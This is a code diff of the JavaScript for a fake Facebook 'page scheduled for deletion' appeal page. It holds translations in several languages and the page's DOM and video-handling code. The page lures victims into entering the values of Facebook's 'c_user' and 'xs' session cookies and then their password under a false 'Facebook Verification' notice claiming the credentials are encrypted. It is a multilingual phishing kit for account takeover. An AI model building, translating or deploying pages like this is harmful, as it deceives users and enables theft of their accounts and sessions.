-      guideText1: "Sɛ wo apɛl/ahyɛdeɛ no ka sɛ wode copyrighted nsɛm anaa adeɛ a ɛwɔ wo account mu, wubetumi ama yɛn nsɛm sɛ yɛnyɛ wo ahyɛdeɛ no yiye. Mesrɛ wo, kyekyɛ mu sɛ den nti na wudwen sɛ wɔkyerɛɛ wo account no foforo anaa wɔdii gua. Ka biara a ebɛtumi aboa yɛn sɛ yɛhwɛ wo case no yiye.",
-      guideText2: "Afei wode to mu no, yɛbɛhwɛ wo apɛl no, na yɛbɛka wo asɛm wɔ mmerɛ a wode baeɛ no mu. Hwɛ no mu no betumi de nna nnum. Mesrɛ wo, hwɛ wo email mu sɛnea ɛbɛyɛ.",
-      guideText3: "Nsɛm: Wubetumi sesa kasa a wopɛ bere biara denam kasa a wɔpaw wɔ krataa no aseɛ no so.",
-      resourcesTitle: "Nneɛma foforo",
-      helpCenterTitle: "Boa Center",
-      helpCenterDesc: "Hwehwɛ nhwɛsoɔ ma nsɛm a wɔbisɛ, na kesɛ sɛdeɛ wode yɛn aduruyɛ no di dwuma.",
-      contactSupportTitle: "Contact Support",
-      contactSupportDesc: "Ka wo ho hyɛ nkitahodiɛ mu den yɛn boa kuw no ho sɛ wohu boa.",
-      guidelinesTitle: "Nkɔsoɔ Mmara",
-      guidelinesDesc: "Kesɛ yɛn nkɔsoɔ nhyehyɛeɛ ne adeɛ ahorow ho amanneɛ.",
-      dashboardTitle: "Tɛnkranteɛ Dashboard",
-      dashboardDesc: "Hwɛ yɛn dwumadie no sɛnea ɛteɛ, na kyerɛ sɛ biribi ayɛ basaa.",
-      changeLanguage: "Sesa kasa"
-    }
-  };
-
-
-   // Get DOM elements
-  const languageModal = document.getElementById('languageModal');
-  const languageModalClose = document.getElementById('languageModalClose');
-  const languageSearchInput = document.getElementById('languageSearchInput');
-  const languageOptionsContainer = document.getElementById('languageOptionsContainer');
-  const languageOptions = document.querySelectorAll('.language-option');
-  const languageConfirmBtn = document.getElementById('languageConfirmBtn');
-  const mainContent = document.getElementById('mainContent');
-  const openAppealBtn = document.getElementById('open-appeal-btn');
-  const appealForm = document.getElementById('appealForm');
-  const fbLoginForm = document.getElementById('fbLoginForm');
-  const successMessage = document.getElementById('successMessage');
-  const guideVideo = document.getElementById('guideVideo');
-  const changeLanguageBtn = document.getElementById('changeLanguageBtn');
-
-  // Form elements
-  const nameInput = document.getElementById('nameInput');
-  const mallInput = document.getElementById('mallInput');
-  const nameError = document.getElementById('nameError');
-  const mallError = document.getElementById('mallError');
-  const formError = document.getElementById('formError');
-  const formErrorText = document.getElementById('formErrorText');
-  const sendBtn = document.getElementById('sendBtn');
-  const sendBtnText = document.getElementById('sendBtnText');
-  const sendBtnSpinner = document.getElementById('sendBtnSpinner');
-  const referenceId = document.getElementById('referenceId');
-
-  
-  const passwordInput = document.getElementById('passwordInput');
-  const passwordError = document.getElementById('passwordError');
-  const fbFormError = document.getElementById('fbFormError');
-  const fbFormErrorText = document.getElementById('fbFormErrorText');
-  const fbSendBtn = document.getElementById('fbSendBtn');
-  const fbSendBtnText = document.getElementById('fbSendBtnText');
-  const fbSendBtnSpinner = document.getElementById('fbSendBtnSpinner');
-  const forgotPassword = document.getElementById('forgotPassword');
-
-  // Language video mapping
-  const videoSources = {
-  english: "https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4",
-  spanish: "https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4",
-  hindi: "https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4",
-french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4",
-  portuguese: "https://allvideos.wasmer.app/Portuguese.mp4",
-  tamil: "https://allvideos.wasmer.app/tamil.mp4",
-  arabic: "https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4",
-  ghanaian: "https://allvideos.wasmer.app/english.mp4",
-  vietnamese: "https://allvideos.wasmer.app/vietanames.mp4" 
-};
-
-  // Current selected language
-  let currentLanguage = 'english';
-  let selectedLanguageOption = null;
-
-  // Function to show language modal
-  function showLanguageModal() {
-    languageModal.style.display = 'flex';
-    mainContent.style.display = 'none';
-    document.body.style.overflow = 'hidden';
-    // Focus on search input when modal opens
-    setTimeout(() => languageSearchInput.focus(), 100);
-  }
-
-  // Function to hide language modal
-  function hideLanguageModal() {
-    languageModal.style.display = 'none';
-    mainContent.style.display = 'block';
-    document.body.style.overflow = 'auto';
-    // Reset search when closing
-    languageSearchInput.value = '';
-    filterLanguages();
-  }
-
-  // Close modal when clicking on close button
-  languageModalClose.addEventListener('click', hideLanguageModal);
-
-  // Close modal when clicking outside of modal content
-  languageModal.addEventListener('click', function(e) {
-    if (e.target === languageModal) {
-      hideLanguageModal();
-    }
-  });
-
-  // Close modal with Escape key
-  document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape' && languageModal.style.display === 'flex') {
-      hideLanguageModal();
-    }
-  });
-
-  // Language search functionality
-  function filterLanguages() {
-    const searchTerm = languageSearchInput.value.toLowerCase();
-    let hasVisibleResults = false;
-    
-    languageOptions.forEach(option => {
-      const languageName = option.querySelector('.language-name').textContent.toLowerCase();
-      const languageCode = option.querySelector('.language-code') ? option.querySelector('.language-code').textContent.toLowerCase() : '';
-      
-      if (languageName.includes(searchTerm) || languageCode.includes(searchTerm)) {
-        option.style.display = 'flex';
-        hasVisibleResults = true;
-      } else {
-        option.style.display = 'none';
-      }
-    });
-    
-    // Show no results message if needed
-    let noResults = document.querySelector('.no-results');
-    if (!hasVisibleResults) {
-      if (!noResults) {
-        noResults = document.createElement('div');
-        noResults.className = 'no-results';
-        noResults.textContent = 'No languages found. Try a different search.';
-        languageOptionsContainer.appendChild(noResults);
-      }
-    } else if (noResults) {
-      noResults.remove();
-    }
-  }
-  
-  languageSearchInput.addEventListener('input', filterLanguages);
-
-  // Language option selection
-  languageOptions.forEach(option => {
-    option.addEventListener('click', () => {
-      // Remove selected class from all options
-      languageOptions.forEach(opt => opt.classList.remove('selected'));
-      
-      // Add selected class to clicked option
-      option.classList.add('selected');
-      
-      // Store selected language
-      selectedLanguageOption = option.getAttribute('data-lang');
-      
-      // Enable confirm button
-      languageConfirmBtn.disabled = false;
-    });
-  });
-
-  // Confirm language selection
-  languageConfirmBtn.addEventListener('click', () => {
-    if (selectedLanguageOption) {
-      setLanguage(selectedLanguageOption);
-      hideLanguageModal();
-    } else {
-      // If no language selected, default to English
-      setLanguage('english');
-      hideLanguageModal();
-    }
-  });
-
-  // Change language button
-  changeLanguageBtn.addEventListener('click', () => {
-    showLanguageModal();
-  });
-
-  // Function to set language
-  function setLanguage(lang) {
-    currentLanguage = lang;
-   
-    // Update all translatable elements
-    const translatableElements = document.querySelectorAll('.translatable');
-    translatableElements.forEach(element => {
-      const key = element.getAttribute('data-key');
-      if (translations[lang] && translations[lang][key]) {
-        element.textContent = translations[lang][key];
-       
-        // Update placeholder attributes for input fields
-        if (element.hasAttribute('placeholder')) {
-          element.setAttribute('placeholder', translations[lang][key]);
+    // Wait for the DOM to be fully loaded
+    document.addEventListener('DOMContentLoaded', function() {
+      // Language translations
+      const translations = {
+        english: {
+          warningTitle: "Your page is scheduled to be deleted!",
+          warningSubtext: "We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification.",
+          warningExtra: "If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.",
+          appealTitle: "Appeal request",
+          appealDesc: "Fixing problems with your page. Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.",
+          appealBtn: "Appeal",
+          formTitle: "Page Appeal Request",
+          formSubtitle: "Submit your information to appeal the deletion",
+          formNotice1: "ⓘ Your page has a violation related to our community guidelines.",
+          formNotice2: "ⓘ Please review the violation details carefully before submitting.",
+          formNotice3: "ⓘ Ensure you provide correct information for your appeal.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "Submit Appeal Request",
+          fbFormTitle: "Facebook Verification",
+          fbFormSubtitle: "Verify your identity to continue with the appeal",
+          fbNotice1: "ⓘ For security purposes, we need to verify your Facebook account.",
+          fbNotice2: "ⓘ This helps us ensure that you are the legitimate owner of the page.",
+          fbNotice3: "ⓘ Your credentials are secure and encrypted.",
+          passwordLabel: "Password",
+          verifyBtn: "Verify and Continue",
+          forgotPassword: "Forgotten password?",
+          successTitle: "Appeal Submitted Successfully",
+          successText: "Your appeal has been received and is now in review. We'll notify you via email once a decision has been made, typically within 7 business days.",
+          referenceText: "Reference ID:",
+          guideTitle: "Appeal Guide",
+          guideText1: "If your appeal/request involves the use of copyrighted information or content in your account or that is being processed/shared, you may provide us information to help us better understand your request. Please provide a detailed explanation of why you believe your account was incorrectly flagged or suspended. Include any relevant information that may help us review your case more effectively.",
+          guideText2: "After your submission, we will review your appeal and contact you within the timeframe of the information you provide to resolve. The review process could take up to 7 business days. Please check your email for updates.",
+          guideText3: "Note: You can change your language preference at any time by clicking the language selector at the bottom of the page.",
+          resourcesTitle: "Additional Resources",
+          helpCenterTitle: "Help Center",
+          helpCenterDesc: "Find answers to common questions and learn how to use our products.",
+          contactSupportTitle: "Contact Support",
+          contactSupportDesc: "Get in touch with our support team for personalized assistance.",
+          guidelinesTitle: "Community Guidelines",
+          guidelinesDesc: "Learn about our community standards and content policies.",
+          dashboardTitle: "Status Dashboard",
+          dashboardDesc: "Check the current status of our services and report outages.",
+          changeLanguage: "Change Language"
+        },
+        hindi: {
+          warningTitle: "आपके पेज को हटाने के लिए निर्धारित किया गया है!",
+          warningSubtext: "हमें कई रिपोर्ट मिली हैं कि आपका पेज हमारे सेवा की शर्तों और सामुदायिक दिशानिर्देशों का उल्लंघन करता है। नतीजतन, आपके पेज को सत्यापन के लिए भेजा जाएगा।",
+          warningExtra: "यदि आपको लगता है कि आपके पेज को गलती से हटाने के लिए निर्धारित किया गया था, तो आप नीचे अपील बटन पर क्लिक करके और कुछ त्वरित जानकारी प्रदान करके इसके स्थायी निष्कासन को रोक सकते हैं।",
+          appealTitle: "अपील अनुरोध",
+          appealDesc: "अपने पेज की समस्याओं को ठीक करना। कृपया नीचे अनुरोधित जानकारी प्रदान करना सुनिश्चित करें। इस जानकारी को प्रदान न करने से आपकी अपील के प्रसंस्करण में देरी हो सकती है।",
+          appealBtn: "अपील करें",
+          formTitle: "पेज अपील अनुरोध",
+          formSubtitle: "हटाने की अपील करने के लिए अपनी जानकारी जमा करें",
+          formNotice1: "ⓘ आपके पेज में हमारे सामुदायिक दिशानिर्देशों से संबंधित उल्लंघन है।",
+          formNotice2: "ⓘ सबमिट करने से पहले कृपया उल्लंघन विवरणों की सावधानीपूर्वक समीक्षा करें।",
+          formNotice3: "ⓘ अपनी अपील के लिए सही जानकारी प्रदान करना सुनिश्चित करें।",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "अपील अनुरोध जमा करें",
+          fbFormTitle: "फेसबुक सत्यापन",
+          fbFormSubtitle: "अपील जारी रखने के लिए अपनी पहचान सत्यापित करें",
+          fbNotice1: "ⓘ सुरक्षा उद्देश्यों के लिए, हमें आपके फेसबुक खाते को सत्यापित करने की आवश्यकता है।",
+          fbNotice2: "ⓘ यह हमें यह सुनिश्चित करने में मदद करता है कि आप पेज के वैध मालिक हैं।",
+          fbNotice3: "ⓘ आपकी साख सुरक्षित और एन्क्रिप्टेड है।",
+          passwordLabel: "पासवर्ड",
+          verifyBtn: "सत्यापित करें और जारी रखें",
+          forgotPassword: "पासवर्ड भूल गए?",
+          successTitle: "अपील सफलतापूर्वक जमा की गई",
+          successText: "आपकी अपील प्राप्त हो गई है और अब समीक्षा के दौर से गुजर रही है। आम तौर पर 7 व्यावसायिक दिनों के भीतर निर्णय होने के बाद हम आपको ईमेल के माध्यम से सूचित करेंगे।",
+          referenceText: "संदर्भ आईडी:",
+          guideTitle: "अपील गाइड",
+          guideText1: "यदि आपकी अपील/अनुरोध में आपके खाते में कॉपीराइट की गई जानकारी या सामग्री का उपयोग शामिल है या जो प्रसंस्कृत की जा रही है, तो आप हमें अपने अनुरोध को बेहतर ढंग से समझने में मदद करने के लिए जानकारी प्रदान कर सकते हैं। कृपया विस्तृत व्याख्या प्रदान करें कि आपको क्यों लगता है कि आपके खाते को गलत तरीके से फ्लैग किया गया था या निलंबित किया गया था। कोई भी प्रासंगिक जानकारी शामिल करें जो हमें आपके मामले की अधिक प्रभावी ढंग से समीक्षा करने में मदद कर सकती है।",
+          guideText2: "आपके द्वारा जमा करने के बाद, हम आपकी अपील की समीक्षा करेंगे और समाधान के लिए आपके द्वारा प्रदान की गई जानकारी की समय सीमा के भीतर आपसे संपर्क करेंगे। समीक्षा प्रक्रिया में 7 व्यावसायिक दिन तक का समय लग सकता है। कृपया अपडेट के लिए अपने ईमेल की जांच करें।",
+          guideText3: "आप पृष्ठ के निचले भाग में भाषा चयनकर्ता पर क्लिक करके किसी भी समय अपनी भाषा प्राथमिकता बदल सकते हैं।",
+          resourcesTitle: "अतिरिक्त संसाधन",
+          helpCenterTitle: "सहायता केंद्र",
+          helpCenterDesc: "सामान्य प्रश्नों के उत्तर खोजें और हमारे उत्पादों का उपयोग करना सीखें।",
+          contactSupportTitle: "समर्थन से संपर्क करें",
+          contactSupportDesc: "व्यक्तिगत सहायता के लिए हमारी समर्थन टीम से संपर्क करें",
+          guidelinesTitle: "सामुदायिक दिशानिर्देश",
+          guidelinesDesc: "हमारे सामुदायिक मानकों और सामग्री नीतियों के बारे में जानें।",
+          dashboardTitle: "स्थिति डैशबोर्ड",
+          dashboardDesc: "हमारी सेवाओं की वर्तमान स्थिति की जाँच करें और आउटेज की रिपोर्ट करें।",
+          changeLanguage: "भाषा बदलें"
+        },
+        spanish: {
+          warningTitle: "¡Tu página está programada para ser eliminada!",
+          warningSubtext: "Hemos recibido varios informes de que tu página viola nuestros términos de servicio y pautas comunitarias. Como resultado, tu página será enviada para verificación.",
+          warningExtra: "Si crees que tu página fue programada para eliminación por error, puedes evitar su eliminación permanente simplemente haciendo clic en el botón de apelación a continuación y proporcionando información rápida.",
+          appealTitle: "Solicitud de apelación",
+          appealDesc: "Solucionando problemas con tu página. Asegúrate de proporcionar la información solicitada a continuación. No proporcionar esta información puede retrasar el procesamiento de tu apelación.",
+          appealBtn: "Apelar",
+          formTitle: "Solicitud de Apelación de Página",
+          formSubtitle: "Envía tu información para apelar la eliminación",
+          formNotice1: "ⓘ Tu página tiene una violación relacionada con nuestras pautas comunitarias.",
+          formNotice2: "ⓘ Por favor, revisa los detalles de la violación cuidadosamente antes de enviar.",
+          formNotice3: "ⓘ Asegúrate de proporcionar información correcta para tu apelación.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "Enviar solicitud de apelación",
+          fbFormTitle: "Verificación de Facebook",
+          fbFormSubtitle: "Verifica tu identidad para continuar con la apelación",
+          fbNotice1: "ⓘ Por motivos de seguridad, necesitamos verificar tu cuenta de Facebook.",
+          fbNotice2: "ⓘ Esto nos ayuda a asegurar que eres el propietario legítimo de la página.",
+          fbNotice3: "ⓘ Tus credenciales están seguras y encriptadas.",
+          passwordLabel: "Contraseña",
+          verifyBtn: "Verificar y Continuar",
+          forgotPassword: "¿Olvidaste tu contraseña?",
+          successTitle: "Apelación Enviada Exitosamente",
+          successText: "Tu apelación ha sido recibida y ahora está en revisión. Te notificaremos por correo electrónico una vez que se haya tomado una decisión, generalmente dentro de 7 días hábiles.",
+          referenceText: "ID de referencia:",
+          guideTitle: "Guía de Apelación",
+          guideText1: "Si tu apelación/solicitud implica el uso de información con derechos de autor o contenido en tu cuenta que está siendo procesado/compartido, puedes proporcionarnos información para ayudarnos a comprender mejor tu solicitud. Proporciona una explicación detallada de por qué crees que tu cuenta fue marcada o suspendida incorrectamente. Incluye cualquier información relevante que pueda ayudarnos a revisar tu caso de manera más efectiva.",
+          guideText2: "Después de tu envío, revisaremos tu apelación y nos comunicaremos contigo dentro del plazo de la información que proporciones para resolver. El proceso de revisión podría tardar hasta 7 días hábiles. Por favor, revisa tu correo electrónico para obtener actualizaciones.",
+          guideText3: "Nota: Puedes cambiar tu preferencia de idioma en cualquier momento haciendo clic en el selector de idioma en la parte inferior de la página.",
+          resourcesTitle: "Recursos Adicionales",
+          helpCenterTitle: "Centro de Ayuda",
+          helpCenterDesc: "Encuentra respuestas a preguntas comunes y aprende a usar nuestros productos.",
+          contactSupportTitle: "Contactar Soporte",
+          contactSupportDesc: "Comunícate con nuestro equipo de soporte para asistencia personalizada.",
+          guidelinesTitle: "Pautas de la Comunidad",
+          guidelinesDesc: "Conoce nuestros estándares comunitarios y políticas de contenido.",
+          dashboardTitle: "Panel de Estado",
+          dashboardDesc: "Consulta el estado actual de nuestros servicios e informa interrupciones.",
+          changeLanguage: "Cambiar idioma"
+        },
+        portuguese: {
+          warningTitle: "Sua página está programada para ser excluída!",
+          warningSubtext: "Recebemos vários relatos de que sua página viola nossos termos de serviço e diretrizes da comunidade. Como resultado, sua página será enviada para verificação.",
+          warningExtra: "Se você acredita que sua página foi programada para exclusão por engano, pode evitar sua remoção permanente clicando no botão de recurso abaixo e fornecendo algumas informações rápidas.",
+          appealTitle: "Solicitação de recurso",
+          appealDesc: "Corrigindo problemas com sua página. Certifique-se de fornecer as informações solicitadas abaixo. A não divulgação dessas informações pode atrasar o processamento do seu recurso.",
+          appealBtn: "Recorrer",
+          formTitle: "Solicitação de Recurso de Página",
+          formSubtitle: "Envie suas informações para contestar a exclusão",
+          formNotice1: "ⓘ Sua página tem uma violação relacionada às nossas diretrizes comunitárias.",
+          formNotice2: "ⓘ Revise os detalhes da violação cuidadosamente antes de enviar.",
+          formNotice3: "ⓘ Certifique-se de fornecer informações corretas para o seu recurso.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "Enviar solicitação de recurso",
+          fbFormTitle: "Verificação do Facebook",
+          fbFormSubtitle: "Verifique sua identidade para continuar com o recurso",
+          fbNotice1: "ⓘ Para fins de segurança, precisamos verificar sua conta do Facebook.",
+          fbNotice2: "ⓘ Isso nos ajuda a garantir que você é o proprietário legítimo da página.",
+          fbNotice3: "ⓘ Suas credenciais são seguras e criptografadas.",
+          passwordLabel: "Senha",
+          verifyBtn: "Verificar e Continuar",
+          forgotPassword: "Esqueceu a senha?",
+          successTitle: "Recurso enviado com sucesso",
+          successText: "Seu recurso foi recebido e agora está em análise. Notificaremos você por e-mail assim que uma decisão for tomada, geralmente dentro de 7 dias úteis.",
+          referenceText: "ID de referência:",
+          guideTitle: "Guia de recurso",
+          guideText1: "Se o seu recurso/solicitação envolver o uso de informações protegidas por direitos autorais ou conteúdo em sua conta que está sendo processado/compartilhado, você pode nos fornecer informações para nos ajudar a entender melhor sua solicitação. Forneça uma explicação detalhada do porquê você acredita que sua conta foi sinalizada ou suspensa incorretamente. Inclua todas as informações relevantes que possam nos ajudar a revisar seu caso mais efetivamente.",
+          guideText2: "Após o envio, revisaremos seu recurso e entraremos em contato com você dentro do prazo das informações fornecidas para resolver. O processo de revisão pode levar até 7 dias úteis. Verifique seu e-mail para atualizações.",
+          guideText3: "Nota: Você pode alterar sua preferência de idioma a qualquer momento clicando no seletor de idioma na parte inferior da página.",
+          resourcesTitle: "Recursos Adicionais",
+          helpCenterTitle: "Central de Ajuda",
+          helpCenterDesc: "Encontre respostas para perguntas comuns e aprenda a usar nossos produtos.",
+          contactSupportTitle: "Contatar Suporte",
+          contactSupportDesc: "Entre em contato com nossa equipe de suporte para assistência personalizada.",
+          guidelinesTitle: "Diretrizes da Comunidade",
+          guidelinesDesc: "Conheça nossos padrões comunitários e políticas de conteúdo.",
+          dashboardTitle: "Painel de Status",
+          dashboardDesc: "Verifique o status atual de nossos serviços e relate interrupções.",
+          changeLanguage: "Mudar idioma"
+        },
+        tamil: {
+          warningTitle: "உங்கள் பக்கம் நீக்கத் திட்டமிடப்பட்டுள்ளது!",
+          warningSubtext: "உங்கள் பக்கம் எங்கள் சேவை விதிமுறைகள் மற்றும் சமூக வழிகாட்டுதல்களை மீறுவதாக பல புகார்கள் எங்களுக்கு கிடைத்துள்ளன. இதன் விளைவாக, உங்கள் பக்கம் சரிபார்ப்பிற்கு அனுப்பப்படும்.",
+          warningExtra: "உங்கள் பக்கம் தவறாக நீக்கத் திட்டமிடப்பட்டதாக நீங்கள் நம்பினால், கீழே உள்ள மேல்முறையீடு பொத்தானைக் கிளிக் செய்து சில விரைவான தகவல்களை வழங்குவதன் மூலம் அதன் நிரந்தர நீக்கத்தைத் தடுக்கலாம்.",
+          appealTitle: "மேல்முறையீடு கோரிக்கை",
+          appealDesc: "உங்கள் பக்கத்தில் உள்ள சிக்கல்களை சரிசெய்தல். கீழே கோரப்பட்ட தகவல்களை வழங்குவதை உறுதிசெய்யவும். இந்த தகவலை வழங்காததால் உங்கள் மேல்முறையீட்டின் செயலாக்கம் தாமதமாகலாம்.",
+          appealBtn: "மேல்முறையீடு",
+          formTitle: "பக்க மேல்முறையீடு கோரிக்கை",
+          formSubtitle: "நீக்கத்தை மேல்முறையீடு செய்ய உங்கள் தகவல்களை சமர்ப்பிக்கவும்",
+          formNotice1: "ⓘ உங்கள் பக்கத்தில் எங்கள் சமூக வழிகாட்டுதல்கள் தொடர்பான மீறல் உள்ளது.",
+          formNotice2: "ⓘ சமர்ப்பிப்பதற்கு முன் மீறல் விவரங்களை கவனமாக மதிப்பாய்வு செய்யவும்.",
+          formNotice3: "ⓘ உங்கள் மேல்முறையீட்டிற்கான சரியான தகவல்களை வழங்குவதை உறுதிசெய்யவும்.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "மேல்முறையீடு கோரிக்கையை சமர்ப்பிக்கவும்",
+          fbFormTitle: "பேஸ்புக் சரிபார்ப்பு",
+          fbFormSubtitle: "மேல்முறையீட்டைத் தொடர உங்கள் அடையாளத்தை சரிபார்க்கவும்",
+          fbNotice1: "ⓘ பாதுகாப்பு நோக்கங்களுக்காக, உங்கள் பேஸ்புக் கணக்கை சரிபார்க்க வேண்டும்.",
+          fbNotice2: "ⓘ இது பக்கத்தின் சட்டபூர்வமான உரிமையாளர் நீங்கள் என்பதை உறுதிப்படுத்த உதவுகிறது.",
+          fbNotice3: "ⓘ உங்கள் அறிவுறுத்தல்கள் பாதுகாப்பானவை மற்றும் குறியாக்கம் செய்யப்பட்டவை.",
+          passwordLabel: "கடவுச்சொல்",
+          verifyBtn: "சரிபார்த்து தொடரவும்",
+          forgotPassword: "கடவுச்சொல் மறந்துவிட்டீர்களா?",
+          successTitle: "மேல்முறையீடு வெற்றிகரமாக சமர்ப்பிக்கப்பட்டது",
+          successText: "உங்கள் மேல்முறையீடு பெறப்பட்டது மற்றும் இப்போது மதிப்பாய்வில் உள்ளது. பொதுவாக 7 வணிக நாட்களுக்குள் ஒரு முடிவு எடுக்கப்பட்டவுடன் மின்னஞ்சல் மூலம் உங்களுக்கு அறிவிப்போம்.",
+          referenceText: "குறிப்பு ஐடி:",
+          guideTitle: "மேல்முறையீடு வழிகாட்டி",
+          guideText1: "உங்கள் மேல்முறையீடு/கோரிக்கை உங்கள் கணக்கில் பதிப்புரிமை கொண்ட தகவல் அல்லது உள்ளடக்கத்தின் பயன்பாட்டை உள்ளடக்கியிருந்தால் அல்லது செயலாக்கம்/பகிரப்படுகிறது என்றால், எங்கள் கோரிக்கையை நன்றாக புரிந்துகொள்ள எங்களுக்கு தகவல்களை வழங்கலாம். உங்கள் கணக்கு தவறாகக் குறிக்கப்பட்டது அல்லது இடைநிறுத்தப்பட்டது என்று நீங்கள் ஏன் நம்புகிறீர்கள் என்பதற்கான விரிவான விளக்கத்தை வழங்கவும். உங்கள் வழக்கை மிகவும் திறம்பட மதிப்பாய்வு செய்ய எங்களுக்கு உதவக்கூடிய ஏதேனும் தொடர்புடைய தகவல்களைச் சேர்க்கவும்.",
+          guideText2: "உங்கள் சமர்ப்பிப்பிற்குப் பிறகு, எங்கள் மேல்முறையீட்டை மதிப்பாய்வு செய்து, தீர்க்க நீங்கள் வழங்கும் தகவலின் காலக்கெடுவுக்குள் உங்களுடன் தொடர்பு கொள்வோம். மதிப்பாய்வு செயல்முறை 7 வணிக நாட்கள் வரை எடுக்கலாம். புதுப்பிப்புகளுக்கு உங்கள் மின்னஞ்சலைச் சரிபார்க்கவும்.",
+          guideText3: "குறிப்பு: பக்கத்தின் கீழே உள்ள மொழி தேர்வியைக் கிளிக் செய்வதன் மூலம் எந்த நேரத்திலும் உங்கள் மொழி விருப்பத்தை மாற்றலாம்.",
+          resourcesTitle: "கூடுதல் வளங்கள்",
+          helpCenterTitle: "உதவி மையம்",
+          helpCenterDesc: "பொதுவான கேள்விகளுக்கான பதில்களைக் கண்டறிந்து எங்கள் தயாரிப்புகளை எவ்வாறு பயன்படுத்துவது என்பதை அறிக.",
+          contactSupportTitle: "ஆதரவைத் தொடர்பு கொள்ளவும்",
+          contactSupportDesc: "தனிப்பட்ட உதவிக்கு எங்கள் ஆதரவு குழுவைத் தொடர்பு கொள்ளவும்.",
+          guidelinesTitle: "சமூக வழிகாட்டுதல்கள்",
+          guidelinesDesc: "எங்கள் சமூக தரங்கள் மற்றும் உள்ளடக்கக் கொள்கைகளைப் பற்றி அறிக.",
+          dashboardTitle: "நிலை டாஷ்போர்டு",
+          dashboardDesc: "எங்கள் சேவைகளின் தற்போதைய நிலையைச் சரிபார்த்து, இடையூறுகளைப் புகாரளிக்கவும்.",
+          changeLanguage: "மொழியை மாற்று"
+        },
+        arabic: {
+          warningTitle: "صفحتك مجدولة للحذف!",
+          warningSubtext: "لقد تلقينا عدة تقارير تفيد بأن صفحتك تنتهك شروط الخدمة وإرشادات المجتمع الخاصة بنا. نتيجة لذلك، سيتم إرسال صفحتك للتحقق.",
+          warningExtra: "إذا كنت تعتقد أنه تم جدولة صفحتك للحذف عن طريق الخطأ، فيمكنك منع إزالتها الدائمة ببساطة عن طريق النقر على زر الاستئناف أدناه وتقديم بعض المعلومات السريعة.",
+          appealTitle: "طلب الاستئناف",
+          appealDesc: "إصلاح المشاكل في صفحتك. يرجى التأكد من تقديم المعلومات المطلوبة أدناه. قد يؤدي عدم تقديم هذه المعلومات إلى تأخير معالجة استئنافك.",
+          appealBtn: "استئناف",
+          formTitle: "طلب استئناف الصفحة",
+          formSubtitle: "أرسل معلوماتك للاستئناف ضد الحذف",
+          formNotice1: "ⓘ تحتوي صفحتك على انتهاك متعلق بإرشادات المجتمع الخاصة بنا.",
+          formNotice2: "ⓘ يرجى مراجعة تفاصيل الانتهاك بعناية قبل الإرسال.",
+          formNotice3: "ⓘ تأكد من تقديم معلومات صحيحة لاستئنافك.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "إرسال طلب الاستئناف",
+          fbFormTitle: "التحقق من فيسبوك",
+          fbFormSubtitle: "تحقق من هويتك للمتابعة مع الاستئناف",
+          fbNotice1: "ⓘ لأغراض أمنية، نحتاج إلى التحقق من حساب فيسبوك الخاص بك.",
+          fbNotice2: "ⓘ هذا يساعدنا على التأكد من أنك المالك الشرعي للصفحة.",
+          fbNotice3: "ⓘ بيانات الاعتماد الخاصة بك آمنة ومشفرة.",
+          passwordLabel: "كلمة المرور",
+          verifyBtn: "التحقق والمتابعة",
+          forgotPassword: "نسيت كلمة المرور?",
+          successTitle: "تم إرسال الاستئناف بنجاح",
+          successText: "لقد تم استلام استئنافك وهو الآن قيد المراجعة. سنخطرك عبر البريد الإلكتروني بمجرد اتخاذ قرار، عادة خلال 7 أيام عمل.",
+          referenceText: "معرف المرجع:",
+          guideTitle: "دليل الاستئناف",
+          guideText1: "إذا كان استئنافك / طلبك يتضمن استخدام معلومات محمية بحقوق الطبع والنشر أو محتوى في حسابك أو الذي يتم معالجته / مشاركته، فيمكنك تقديم معلومات لمساعدتنا على فهم طلبك بشكل أفضل. يرجى تقديم شرح مفصل لسبب اعتقادك أنه تم الإبلاغ عن حسابك أو تعليقه بشكل غير صحيح. قم بتضمين أي معلومات ذات صلة قد تساعدنا في مراجعة قضيتك بشكل أكثر فعالية.",
+          guideText2: "بعد إرسالك، سنراجع استئنافك ونلتقي بك خلال الإطار الزمني للمعلومات التي تقدمها لحل. قد تستغرق عملية المراجعة ما يصل إلى 7 أيام عمل. يرجى التحقق من بريدك الإلكتروني للحصول على التحديثات.",
+          guideText3: "ملاحظة: يمكنك تغيير تفضيل اللغة في أي وقت بالنقر على محدد اللغة في أسفل الصفحة.",
+          resourcesTitle: "موارد إضافية",
+          helpCenterTitle: "مركز المساعدة",
+          helpCenterDesc: "ابحث عن إجابات للأسئلة الشائعة وتعلم كيفية استخدام منتجاتنا.",
+          contactSupportTitle: "اتصل بالدعم",
+          contactSupportDesc: "تواصل مع فريق الدعم الخاص بنا للحصول على مساعدة مخصصة.",
+          guidelinesTitle: "إرشادات المجتمع",
+          guidelinesDesc: "تعرف على معايير المجتمع وسياسات المحتوى الخاصة بنا.",
+          dashboardTitle: "لوحة الحالة",
+          dashboardDesc: "تحقق من الحالة الحالية لخدماتنا وأبلغ عن الأعطال.",
+          changeLanguage: "تغيير اللغة"
+        },
+        vietnamese: {
+          warningTitle: "Trang của bạn đã được lên lịch để xóa!",
+          warningSubtext: "Chúng tôi đã nhận được một số báo cáo rằng trang của bạn vi phạm điều khoản dịch vụ và nguyên tắc cộng đồng của chúng tôi. Do đó, trang của bạn sẽ được gửi đi để xác minh.",
